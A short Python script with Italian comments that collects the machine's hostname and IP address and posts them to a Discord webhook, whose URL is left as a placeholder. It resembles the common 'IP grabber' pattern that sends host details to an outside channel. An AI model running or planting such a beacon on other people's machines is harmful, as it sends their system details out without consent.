import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

host_name = socket.gethostname()
ip_adress = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP adress: ", ip_adress)

content = "Placeholder Message"
webhook = DiscordWebhook(url="WEBHOOK_URL" , username="NOME_DEL_WEBHOOK", content=content) #METTI IL WEBHOOK URL NEGLI APICI , ANCHE IL NOME DEL WEBHOOK
embed = DiscordEmbed(title="IP: " + ip_adress + " | Host: " + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()
